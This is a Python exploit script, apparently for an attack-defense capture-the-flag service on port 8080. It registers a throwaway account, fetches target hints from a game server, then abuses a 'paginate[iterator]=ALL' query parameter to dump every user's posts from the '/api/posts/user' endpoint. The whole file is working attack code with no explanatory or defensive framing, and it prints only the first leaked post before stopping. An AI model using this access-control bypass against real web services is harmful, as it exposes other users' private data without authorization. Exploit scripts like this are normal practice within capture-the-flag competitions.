#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid, json

def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

#ip = sys.argv[1]
ip = '10.80.0.2'
url = 'http://{}'.format(ip) + ':8080'

s = requests.Session()
data = {
    'login' : generator(),
    'password' : generator()
}
s.post(url + '/api/register', json=data, timeout=(None,None))
s.post(url + '/api/login', json=data, timeout=(None,None))

attack_data = s.get('http://10.10.10.10/api/attack_data').json()
posts = re.findall('\d+', str(attack_data['overheard'][ip]))
print(posts)

data = s.get(url + '/api/posts/user?paginate[iterator]=ALL&paginate[limit]=99999', timeout=(None,None)).text
jsonResponse = json.loads(data)

for item in jsonResponse['posts']:
    print(item)

    break